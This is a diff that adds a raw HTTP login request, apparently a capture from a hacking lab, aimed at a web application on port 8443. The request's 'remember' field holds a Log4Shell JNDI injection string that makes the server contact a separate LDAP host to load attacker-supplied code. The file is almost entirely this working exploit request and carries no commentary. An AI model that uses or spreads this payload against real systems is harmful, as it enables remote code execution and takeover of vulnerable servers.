@@ -1,0 +1,15 @@
+POST https://10.129.170.165:8443/api/login HTTP/1.1
+host: 10.129.170.165:8443
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Referer: https://10.129.170.165:8443/manage/account/login?redirect=%2Fmanage
+Content-Type: application/json; charset=utf-8
+content-length: 92
+Origin: https://10.129.170.165:8443
+Connection: keep-alive
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: same-origin
+
+{"username":"user","password":"pass","remember":"${jndi:ldap://10.10.16.26/}","strict":true}
